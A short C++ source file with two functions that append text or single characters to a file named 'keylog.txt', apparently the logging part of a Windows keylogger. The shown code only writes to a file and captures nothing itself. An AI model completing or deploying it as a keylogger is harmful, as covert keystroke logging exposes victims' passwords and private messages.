#include <iostream>
#include <windows.h>
#include <fstream>

#include "logger.h"

using namespace std;

void writeToLog(string text){
    ofstream logfile;
    logfile.open("keylog.txt", ios::app); // write mode : append
    logfile << text;
    logfile.close();
}

void writeToLog(char c){
    ofstream logfile;
    logfile.open("keylog.txt", ios::app); // write mode : append
    logfile << c;
    logfile.close();
}
